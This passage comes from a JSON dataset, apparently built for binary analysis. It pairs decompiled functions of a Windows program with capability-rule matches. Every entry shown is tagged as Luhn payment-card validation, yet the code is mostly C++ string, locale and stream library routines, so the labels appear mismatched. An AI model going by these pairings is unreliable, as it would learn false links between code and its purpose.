        "decompiled_code": "\nvoid __thiscall fcn.004863a0(code **param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    *param_1 = vtable.c_streambufIwSt11char_traitsIwEE.0;\n    param_1[1] = *(param_2 + 4);\n    param_1[2] = *(param_2 + 8);\n    param_1[3] = *(param_2 + 0xc);\n    param_1[4] = *(param_2 + 0x10);\n    param_1[5] = *(param_2 + 0x14);\n    param_1[6] = *(param_2 + 0x18);\n    iVar2 = *0x4f59f4;\n    piVar1 = *(param_2 + 0x1c);\n    param_1[7] = piVar1;\n    if (iVar2 == 0) {\n        *piVar1 = *piVar1 + 1;\n        return;\n    }\n    LOCK();\n    *piVar1 = *piVar1 + 1;\n    return;\n}\n",
        "token_count": 260
    },
    "0048f500": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0048f500(int32_t **param_1, int32_t **param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    iVar2 = *0x4f59f4;\n    piVar1 = *param_2;\n    *param_1 = piVar1;\n    if (iVar2 == 0) {\n        *piVar1 = *piVar1 + 1;\n        return;\n    }\n    LOCK();\n    *piVar1 = *piVar1 + 1;\n    return;\n}\n",
        "token_count": 129
    },
    "004867f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004867f0(int32_t *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    code *UNRECOVERED_JUMPTABLE;\n    int16_t iVar3;\n    uint32_t uVar4;\n    \n    puVar2 = param_1[2];\n    if (puVar2 < param_1[3]) {\n        uVar1 = *puVar2;\n        param_1[2] = puVar2 + 1;\n        return uVar1;\n    }\n    UNRECOVERED_JUMPTABLE = *(*param_1 + 0x28);\n    if (UNRECOVERED_JUMPTABLE == method.ages_bynameIcE.virtual_40) {\n        UNRECOVERED_JUMPTABLE = *(*param_1 + 0x24);\n        if (UNRECOVERED_JUMPTABLE == method.ages_bynameIcE.virtual_36) {\n            return 0xffffffff;\n        }\n        iVar3 = (*UNRECOVERED_JUMPTABLE)();\n        if (iVar3 == -1) {\n            uVar4 = 0xffffffff;\n        }\n        else {\n            uVar4 = *param_1[2];\n            param_1[2] = param_1[2] + 1;\n        }\n        return uVar4;\n    }\n    // WARNING: Could not recover jumptable at 0x00486820. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar4 = (*UNRECOVERED_JUMPTABLE)();\n    return uVar4;\n}\n",
        "token_count": 356
    },
    "00486d40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00486d40(code **param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    *param_1 = vtable.ages_bynameIcE.0;\n    param_1[1] = *(param_2 + 4);\n    param_1[2] = *(param_2 + 8);\n    param_1[3] = *(param_2 + 0xc);\n    param_1[4] = *(param_2 + 0x10);\n    param_1[5] = *(param_2 + 0x14);\n    param_1[6] = *(param_2 + 0x18);\n    iVar2 = *0x4f59f4;\n    piVar1 = *(param_2 + 0x1c);\n    param_1[7] = piVar1;\n    if (iVar2 == 0) {\n        *piVar1 = *piVar1 + 1;\n        return;\n    }\n    LOCK();\n    *piVar1 = *piVar1 + 1;\n    return;\n}\n",
        "token_count": 255
    },
    "0048cb60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0048cb60(uint *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    *param_1 = 0x50b280;\n    param_1[1] = param_2 != 0;\n    uVar1 = fcn.0048f260();\n    param_1[2] = uVar1;\n    *(param_1 + 3) = 0;\n    fcn.0048ca90();\n    return;\n}\n",
        "token_count": 112
    },
    "0048f260": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0048f260(void)\n\n{\n    if (*0x4f59f4 != 0) {\n        fcn.00418ba0(0x4f6ed4, 0x48f320);\n        return *0x4f6ed0;\n    }\n    if (*0x4f6ed0 != 0) {\n        return *0x4f6ed0;\n    }\n    fcn.0048f2e0(0x4f6ed0, 0x5066a0, 0);\n    return *0x4f6ed0;\n}\n",
        "token_count": 136
    },
    "0048f2e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048f2e0(uint *param_1, uint8_t *param_2)\n\n{\n    int32_t iVar1;\n    uint8_t *puVar2;\n    bool bVar3;\n    bool bVar4;\n    \n    iVar1 = 2;\n    bVar3 = &stack0xfffffff8 < 0x14;\n    bVar4 = *0x10 == 0x1c;\n    *param_1 = 0;\n    puVar2 = 0x504e00;\n    do {\n        if (iVar1 == 0) break;\n        iVar1 = iVar1 + -1;\n        bVar3 = *param_2 < *puVar2;\n        bVar4 = *param_2 == *puVar2;\n        param_2 = param_2 + 1;\n        puVar2 = puVar2 + 1;\n    } while (bVar4);\n    if ((!bVar3 && !bVar4) == bVar3) {\n        return;\n    }\n    fcn.0049ef80(\"locale::facet::_S_create_c_locale name not valid\");\n    fcn.0048f2e0(0x4f6ed0, 0x5066a0, 0);\n    return;\n}\n",
        "token_count": 280
    },
    "0048f530": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_19h\n\nvoid __fastcall fcn.0048f530(int32_t **param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    ulong uVar5;\n    uint var_34h;\n    int32_t **var_19h;\n    \n    *param_1 = NULL;\n    fcn.0048cc10();\n    piVar4 = *0x4f6ee4;\n    *param_1 = *0x4f6ee4;\n    if (piVar4 == *0x4f6ec8) {\n        if (*0x4f59f4 == 0) {\n            *piVar4 = *piVar4 + 1;\n            return;\n        }\n        goto code_r0x0048f600;\n    }\n    uVar1 = fcn.00428bc0();\n    if (*0x4f59f4 == 0) {\ncode_r0x0048f567:\n        piVar4 = *0x4f6ee4;\n        **0x4f6ee4 = **0x4f6ee4 + 1;\n        *param_1 = piVar4;\n    }\n    else {\n        iVar2 = fcn.00418d60(uVar1);\n        if (iVar2 != 0) {\n            uVar5 = fcn.0042a720();\n            if (uVar5 >> 0x20 == -1) {\n                uVar5 = fcn.004a37a0(uVar5);\n                if (uVar5 >> 0x20 != -1) goto code_r0x004a53af;\n                fcn.004a37a0(uVar5);\n            }\n            fcn.0041b360();\ncode_r0x004a53af:\n            fcn.0041b360();\n            fcn.00429000();\n            unique0x10000503 = param_1;\n            do {\n                uVar5 = fcn.0041b360(stack0xffffffe4);\n                *NULL = uVar5;\n            } while (uVar5 >> 0x20 != -1);\n            fcn.004a37a0();\n            fcn.0048f380();\n            fcn.0041b360(uVar1);\n            fcn.004a34c0(param_1);\n            fcn.0041b360(uVar1);\n            fcn.0048f380();\n            fcn.0041b360(uVar1);\n            fcn.004a34c0(param_1);\n            fcn.0041b360(uVar1);\n            fcn.0048f380();\n            fcn.0041b360(uVar1);\n            fcn.004a34c0(param_1);\n            fcn.0041b360(uVar1);\n            fcn.0048f380();\n            fcn.0041b360(uVar1);\n            fcn.004a34c0(param_1);\n            fcn.0041b360(uVar1);\n            fcn.0048f380();\n            fcn.0041b360(uVar1);\n            fcn.004a34c0(param_1);\n            fcn.0041b360(uVar1);\n            fcn.0048f380();\n            fcn.0041b360(uVar1);\n            fcn.004a34c0(param_1);\n            fcn.0041b360(uVar1);\n            fcn.0048f380();\n            fcn.0041b360(uVar1);\n            fcn.004a34c0(param_1);\n            fcn.0041b360(uVar1);\n            fcn.0048f380();\n            fcn.0041b360(uVar1);\n            fcn.004a34c0(param_1);\n            fcn.0041b360(uVar1);\n            fcn.0048f380();\n            fcn.0041b360(uVar1);\n            fcn.004a34c0(param_1);\n            fcn.0041b360(uVar1);\n            fcn.0048f380();\n            fcn.0041b360(uVar1);\n            fcn.004a34c0(param_1);\n            fcn.0041b360(uVar1);\n            fcn.0048f380();\n            fcn.0041b360(uVar1);\n            fcn.004a34c0(param_1);\n            fcn.0041b360(uVar1);\n            fcn.0048f380();\n            fcn.0041b360(uVar1);\n            fcn.004a34c0(param_1);\n            fcn.0041b360(uVar1);\n            fcn.0048f380();\n            fcn.0041b360(param_1);\n            fcn.0048f380();\n            fcn.0041b360(param_1);\n            fcn.0048f380();\n            fcn.0041b360(param_1);\n            fcn.0048f380();\n            fcn.0041b360(param_1);\n            fcn.0048f380();\n            fcn.0041b360(param_1);\n            fcn.0048f380();\n            fcn.0041b360(param_1);\n            fcn.0048f380();\n            fcn.0041b360(param_1);\n            fcn.0048f380();\n            fcn.0041b360(param_1);\n            fcn.0048f380();\n            fcn.004a34c0();\n            fcn.0041b360(param_1);\n            fcn.0048f380();\n            fcn.004a34c0();\n            fcn.0041b360(param_1);\n            fcn.0048f380();\n            fcn.004a34c0();\n            fcn.0041b360(param_1);\n            fcn.004a34c0();\n            fcn.0041b360(param_1);\n            fcn.0048f380();\n            fcn.004a34c0();\n            fcn.0041b360(param_1);\n            fcn.0048f380();\n            fcn.004a34c0();\n            fcn.0041b360(param_1);\n            fcn.0048f380();\n            fcn.004a34c0();\n            fcn.0041b360(param_1);\n            fcn.004a34c0();\n            fcn.0041b360(param_1);\n            fcn.0046bf80(unaff_EBP + -0x19);\n            fcn.0041b360(uVar1);\n            if (*(unaff_EBP + -0x1c) != NULL) {\n                (**(unaff_EBP + -0x1c))(uVar1);\n            }\n            fcn.0041b360(param_1);\n            if (*(unaff_EBP + -0x1c) != NULL) {\n                (**(unaff_EBP + -0x1c))(uVar1);\n            }\n            fcn.0041b360(param_1);\n            if (*(unaff_EBP + -0xc) != NULL) {\n                (**(unaff_EBP + -0xc))(uVar1);\n            }\n            fcn.0041b360(param_1);\n            if (*(unaff_EBP + -0xc) != NULL) {\n                (**(unaff_EBP + -0xc))(uVar1);\n            }\n            fcn.0041b360(param_1);\n            if (*(unaff_EBP + -0xc) != NULL) {\n                (**(unaff_EBP + -0xc))(uVar1);\n            }\n            fcn.0041b360(param_1);\n            if (*(unaff_EBP + -0xc) != NULL) {\n                (**(unaff_EBP + -0xc))(uVar1);\n            }\n            fcn.0041b360(param_1);\n            fcn.0046bf80(unaff_EBP + -0x3d);\n            if (*(unaff_EBP + -0x1c) != NULL) {\n                (**(unaff_EBP + -0x1c))(param_1);\n            }\n            fcn.0041b360(uVar1);\n            fcn.004640c0(unaff_EBP + -0x3d);\n            if (*(unaff_EBP + -0x1c) != NULL) {\n                (**(unaff_EBP + -0x1c))();\n            }\n            fcn.0041b360(param_1);\n            fcn.0048f380();\n            fcn.004a34c0(param_1);\n            fcn.0041b360(uVar1);\n            fcn.0048f380();\n            fcn.004a34c0(param_1);\n            fcn.0041b360(uVar1);\n            fcn.0048f380();\n            do {\n                fcn.004a34c0(param_1);\n                fcn.0041b360(uVar1);\n                fcn.004a34c0(param_1);\n                fcn.0041b360(uVar1);\n                fcn.00433e60();\n                fcn.0046e880();\n            } while( true );\n        }\n        if (*0x4f59f4 == 0) goto code_r0x0048f567;\n        LOCK();\n        **0x4f6ee4 = **0x4f6ee4 + 1;\n        *param_1 = *0x4f6ee4;\n    }\n    if ((*0x4f59f4 == 0) || (iVar2 = fcn.00418dc0(uVar1),  iVar2 == 0)) {\n        return;\n    }\n    puVar3 = fcn.004a3610(4);\n    *puVar3 = 0x509ddc;\n    piVar4 = fcn.004a3bc0(puVar3, 0x506a54, 0x42a520);\ncode_r0x0048f600:\n    LOCK();\n    *piVar4 = *piVar4 + 1;\n    return;\n}\n",
        "token_count": 2263
    },
    "0048f700": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048f700(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    puVar4 = *(param_1 + 8);\n    if (puVar4 == NULL) {\n        puVar4 = fcn.004a3500(0x44);\n        *puVar4 = 0x50af14;\n        puVar4[1] = 0;\n        puVar4[2] = 0;\n        puVar4[3] = 0;\n        *(puVar4 + 4) = 0;\n        *(puVar4 + 0x12) = 0;\n        puVar4[5] = 0;\n        puVar4[6] = 0;\n        puVar4[7] = 0;\n        puVar4[8] = 0;\n        puVar4[9] = 0;\n        puVar4[10] = 0;\n        puVar4[0xb] = 0;\n        puVar4[0xc] = 0;\n        puVar4[0xd] = 0;\n        *(puVar4 + 0x43) = 0;\n        *(param_1 + 8) = puVar4;\n    }\n    *(puVar4 + 0x11) = 0x2e;\n    iVar1 = *0x4f6d68;\n    *(*(param_1 + 8) + 0x12) = 0x2c;\n    *(*(param_1 + 8) + 8) = 0x502088;\n    *(*(param_1 + 8) + 0xc) = 0;\n    *(*(param_1 + 8) + 0x14) = 0x502088;\n    *(*(param_1 + 8) + 0x18) = 0;\n    *(*(param_1 + 8) + 0x1c) = 0x502088;\n    *(*(param_1 + 8) + 0x20) = 0;\n    *(*(param_1 + 8) + 0x24) = 0x502088;\n    *(*(param_1 + 8) + 0x28) = 0;\n    *(*(param_1 + 8) + 0x2c) = 0;\n    uVar2 = *0x5064d8;\n    *(*(param_1 + 8) + 0x30) = *0x5064d8;\n    *(*(param_1 + 8) + 0x34) = uVar2;\n    iVar3 = 0;\n    do {\n        *(*(param_1 + 8) + 0x38 + iVar3) = *(iVar1 + iVar3);\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0xb);\n    return;\n}\n",
        "token_count": 660
    },
    "0048fae0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048fae0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    puVar4 = *(param_1 + 8);\n    if (puVar4 == NULL) {\n        puVar4 = fcn.004a3500(0x44);\n        *puVar4 = 0x50af24;\n        puVar4[1] = 0;\n        puVar4[2] = 0;\n        puVar4[3] = 0;\n        *(puVar4 + 4) = 0;\n        *(puVar4 + 0x12) = 0;\n        puVar4[5] = 0;\n        puVar4[6] = 0;\n        puVar4[7] = 0;\n        puVar4[8] = 0;\n        puVar4[9] = 0;\n        puVar4[10] = 0;\n        puVar4[0xb] = 0;\n        puVar4[0xc] = 0;\n        puVar4[0xd] = 0;\n        *(puVar4 + 0x43) = 0;\n        *(param_1 + 8) = puVar4;\n    }\n    *(puVar4 + 0x11) = 0x2e;\n    iVar1 = *0x4f6d68;\n    *(*(param_1 + 8) + 0x12) = 0x2c;\n    *(*(param_1 + 8) + 8) = 0x502088;\n    *(*(param_1 + 8) + 0xc) = 0;\n    *(*(param_1 + 8) + 0x14) = 0x502088;\n    *(*(param_1 + 8) + 0x18) = 0;\n    *(*(param_1 + 8) + 0x1c) = 0x502088;\n    *(*(param_1 + 8) + 0x20) = 0;\n    *(*(param_1 + 8) + 0x24) = 0x502088;\n    *(*(param_1 + 8) + 0x28) = 0;\n    *(*(param_1 + 8) + 0x2c) = 0;\n    uVar2 = *0x5064d8;\n    *(*(param_1 + 8) + 0x30) = *0x5064d8;\n    *(*(param_1 + 8) + 0x34) = uVar2;\n    iVar3 = 0;\n    do {\n        *(*(param_1 + 8) + 0x38 + iVar3) = *(iVar1 + iVar3);\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0xb);\n    return;\n}\n",
        "token_count": 661
    },
    "0048fec0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048fec0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    puVar4 = *(param_1 + 8);\n    if (puVar4 == NULL) {\n        puVar4 = fcn.004a3500(0x54);\n        puVar4[1] = 0;\n        *puVar4 = 0x50af34;\n        puVar4[2] = 0;\n        puVar4[3] = 0;\n        *(puVar4 + 4) = 0;\n        *(puVar4 + 0x12) = 0;\n        puVar4[6] = 0;\n        puVar4[7] = 0;\n        puVar4[8] = 0;\n        puVar4[9] = 0;\n        puVar4[10] = 0;\n        puVar4[0xb] = 0;\n        puVar4[0xc] = 0;\n        puVar4[0xd] = 0;\n        puVar4[0xe] = 0;\n        *(puVar4 + 0x52) = 0;\n        *(param_1 + 8) = puVar4;\n    }\n    iVar1 = *0x4f6d68;\n    *(puVar4 + 0x12) = 0x2e;\n    *(*(param_1 + 8) + 0x14) = 0x2c;\n    *(*(param_1 + 8) + 8) = 0x502088;\n    *(*(param_1 + 8) + 0xc) = 0;\n    *(*(param_1 + 8) + 0x18) = 0x50208a;\n    *(*(param_1 + 8) + 0x1c) = 0;\n    *(*(param_1 + 8) + 0x20) = 0x50208a;\n    *(*(param_1 + 8) + 0x24) = 0;\n    *(*(param_1 + 8) + 0x28) = 0x50208a;\n    *(*(param_1 + 8) + 0x2c) = 0;\n    *(*(param_1 + 8) + 0x30) = 0;\n    uVar2 = *0x5064d8;\n    *(*(param_1 + 8) + 0x34) = *0x5064d8;\n    *(*(param_1 + 8) + 0x38) = uVar2;\n    iVar3 = 0;\n    do {\n        *(*(param_1 + 8) + 0x3c + iVar3 * 2) = *(iVar1 + iVar3);\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0xb);\n    return;\n}\n",
        "token_count": 668
    },
    "004902b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004902b0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    puVar4 = *(param_1 + 8);\n    if (puVar4 == NULL) {\n        puVar4 = fcn.004a3500(0x54);\n        puVar4[1] = 0;\n        *puVar4 = 0x50af44;\n        puVar4[2] = 0;\n        puVar4[3] = 0;\n        *(puVar4 + 4) = 0;\n        *(puVar4 + 0x12) = 0;\n        puVar4[6] = 0;\n        puVar4[7] = 0;\n        puVar4[8] = 0;\n        puVar4[9] = 0;\n        puVar4[10] = 0;\n        puVar4[0xb] = 0;\n        puVar4[0xc] = 0;\n        puVar4[0xd] = 0;\n        puVar4[0xe] = 0;\n        *(puVar4 + 0x52) = 0;\n        *(param_1 + 8) = puVar4;\n    }\n    iVar1 = *0x4f6d68;\n    *(puVar4 + 0x12) = 0x2e;\n    *(*(param_1 + 8) + 0x14) = 0x2c;\n    *(*(param_1 + 8) + 8) = 0x502088;\n    *(*(param_1 + 8) + 0xc) = 0;\n    *(*(param_1 + 8) + 0x18) = 0x50208a;\n    *(*(param_1 + 8) + 0x1c) = 0;\n    *(*(param_1 + 8) + 0x20) = 0x50208a;\n    *(*(param_1 + 8) + 0x24) = 0;\n    *(*(param_1 + 8) + 0x28) = 0x50208a;\n    *(*(param_1 + 8) + 0x2c) = 0;\n    *(*(param_1 + 8) + 0x30) = 0;\n    uVar2 = *0x5064d8;\n    *(*(param_1 + 8) + 0x34) = *0x5064d8;\n    *(*(param_1 + 8) + 0x38) = uVar2;\n    iVar3 = 0;\n    do {\n        *(*(param_1 + 8) + 0x3c + iVar3 * 2) = *(iVar1 + iVar3);\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0xb);\n    return;\n}\n",
        "token_count": 668
    },
    "004906c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004906c0(int32_t *param_1)\n\n{\n    if (*param_1 != param_1 + 2) {\n        fcn.004a34c0(*param_1);\n        return;\n    }\n    return;\n}\n",
        "token_count": 58
    },
    "004910a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004910a0(uint *param_1, uint *param_2)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    int32_t iVar9;\n    \n    if (param_1 == param_2) {\n        return;\n    }\n    puVar2 = *param_1;\n    puVar3 = *param_2;\n    puVar1 = param_2 + 2;\n    if (param_1 + 2 == puVar2) {\n        if (puVar1 == puVar3) {\n            iVar9 = param_2[1];\n            if (param_1[1] == 0) {\n                if (iVar9 != 0) {\n                    param_1[2] = param_2[2];\n                    param_1[3] = param_2[3];\n                    param_1[4] = param_2[4];\n                    param_1[5] = param_2[5];\n                    param_1[1] = param_2[1];\n                    param_2[1] = 0;\n                    **param_2 = 0;\n                    return;\n                }\n                uVar8 = 0;\n            }\n            else {\n                if (iVar9 == 0) {\n                    param_2[2] = param_1[2];\n                    param_2[3] = param_1[3];\n                    param_2[4] = param_1[4];\n                    param_2[5] = param_1[5];\n                    param_2[1] = param_1[1];\n                    param_1[1] = 0;\n                    **param_1 = 0;\n                    return;\n                }\n                uVar4 = param_2[4];\n                uVar5 = param_2[2];\n                uVar6 = param_2[3];\n                uVar7 = param_2[5];\n                param_2[2] = param_1[2];\n                param_2[3] = param_1[3];\n                param_2[4] = param_1[4];\n                param_2[5] = param_1[5];\n                uVar8 = param_1[1];\n                param_1[3] = uVar6;\n                param_1[2] = uVar5;\n                param_1[4] = uVar4;\n                param_1[5] = uVar7;\n                iVar9 = param_2[1];\n            }\n        }\n        else {\n            uVar4 = param_2[2];\n            param_2[2] = param_1[2];\n            param_2[3] = param_1[3];\n            param_2[4] = param_1[4];\n            param_2[5] = param_1[5];\n            *param_1 = puVar3;\n            *param_2 = puVar1;\n            uVar8 = param_1[1];\n            param_1[2] = uVar4;\n            iVar9 = param_2[1];\n        }\n    }\n    else {\n        uVar8 = param_1[2];\n        if (puVar1 == puVar3) {\n            param_1[2] = param_2[2];\n            param_1[3] = param_2[3];\n            param_1[4] = param_2[4];\n            param_1[5] = param_2[5];\n            *param_2 = puVar2;\n            *param_1 = param_1 + 2;\n        }\n        else {\n            *param_1 = puVar3;\n            *param_2 = puVar2;\n            param_1[2] = param_2[2];\n        }\n        param_2[2] = uVar8;\n        iVar9 = param_2[1];\n        uVar8 = param_1[1];\n    }\n    param_1[1] = iVar9;\n    param_2[1] = uVar8;\n    return;\n}\n",
        "token_count": 915
    },
    "00491b30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00491b30(int32_t *param_1, uint32_t param_2, char param_3)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = param_1[1];\n    if (param_2 <= uVar1) {\n        if (param_2 < uVar1) {\n            param_1[1] = param_2;\n            *(*param_1 + param_2) = 0;\n        }\n        return;\n    }\n    fcn.00490f00(uVar1, 0, param_2 - uVar1, param_3);\n    return;\n}\n",
        "token_count": 141
    },
    "004927b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004927b0(uint32_t *param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t extraout_ECX;\n    uint uStack24;\n    \n    uVar1 = *param_1;\n    if (uVar1 < 0) {\n        fcn.0049ec30(0x502e38);\n        *(extraout_ECX + 4) = uStack24;\n        return;\n    }\n    if ((param_2 < uVar1) && (param_2 = param_2 * 2,  uVar1 < param_2)) {\n        if (-1 < param_2) {\n            *param_1 = param_2;\n            fcn.004a3500(param_2 + 1);\n            return;\n        }\n        *param_1 = 0x7fffffff;\n        fcn.004a3500(0x80000000);\n        return;\n    }\n    fcn.004a3500(uVar1 + 1);\n    return;\n}\n",
        "token_count": 230
    },
    "004929c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004929c0(int32_t *param_1, uchar param_2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    \n    iVar1 = param_1[1];\n    piVar2 = *param_1;\n    if (piVar2 == param_1 + 2) {\n        uVar3 = 0xf;\n    }\n    else {\n        uVar3 = param_1[2];\n    }\n    if (uVar3 < iVar1 + 1U) {\n        fcn.00492830(iVar1, 0, 0, 1);\n        piVar2 = *param_1;\n    }\n    *(piVar2 + iVar1) = param_2;\n    param_1[1] = iVar1 + 1U;\n    *(*param_1 + 1 + iVar1) = 0;\n    return;\n}\n",
        "token_count": 209
    },
    "004932f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004932f0(int32_t param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    uint *in_stack_ffffffe8;\n    \n    uVar1 = sub.msvcrt.dll_strlen(param_2);\n    if (uVar1 <= 0x7fffffffU - *(param_1 + 4)) {\n        fcn.00492660(param_2, uVar1);\n        return;\n    }\n    fcn.0049ec30(0x502f56);\n    fcn.00492660(*in_stack_ffffffe8, in_stack_ffffffe8[1]);\n    return;\n}\n",
        "token_count": 145
    },
    "00493440": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00493440(int32_t *param_1)\n\n{\n    if (*param_1 != param_1 + 2) {\n        fcn.004a34c0(*param_1);\n        return;\n    }\n    return;\n}\n",
        "token_count": 57
    },
    "00494910": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00494910(uint param_1)\n\n{\n    fcn.00494930(param_1, 0);\n    return;\n}\n",
        "token_count": 32
    },
    "00494930": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00494930(int32_t *param_1, uint32_t param_2, ushort param_3)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = param_1[1];\n    if (param_2 <= uVar1) {\n        if (param_2 < uVar1) {\n            param_1[1] = param_2;\n            *(*param_1 + param_2 * 2) = 0;\n        }\n        return;\n    }\n    fcn.00493c70(uVar1, 0, param_2 - uVar1, param_3);\n    return;\n}\n",
        "token_count": 143
    },
    "00495640": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00495640(uint32_t *param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t extraout_ECX;\n    uint uStack24;\n    \n    uVar1 = *param_1;\n    if (0x3fffffff < uVar1) {\n        fcn.0049ec30(\"basic_string::_M_create\");\n        *(extraout_ECX + 4) = uStack24;\n        return;\n    }\n    if ((param_2 < uVar1) && (param_2 = param_2 * 2,  uVar1 < param_2)) {\n        if (0x3fffffff < param_2) {\n            *param_1 = 0x3fffffff;\n            fcn.004a3500(0x80000000);\n            return;\n        }\n        *param_1 = param_2;\n        uVar1 = param_2;\n    }\n    fcn.004a3500(uVar1 * 2 + 2);\n    return;\n}\n",
        "token_count": 228
    },
    "00498b60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00498b60(uint *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    *param_1 = 0x50a588;\n    param_1[1] = param_2 != 0;\n    uVar1 = fcn.0048f260();\n    param_1[2] = uVar1;\n    return;\n}\n",
        "token_count": 90
    },
    "00498be0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00498be0(uint *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    *param_1 = 0x50a588;\n    param_1[1] = param_2 != 0;\n    uVar1 = fcn.0048f260();\n    param_1[2] = uVar1;\n    return;\n}\n",
        "token_count": 90
    },
    "00498cf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00498cf0(uint *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    *param_1 = 0x50a5a4;\n    param_1[1] = param_2 != 0;\n    uVar1 = fcn.0048f260();\n    param_1[2] = uVar1;\n    return;\n}\n",
        "token_count": 92
    },
    "00498d70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
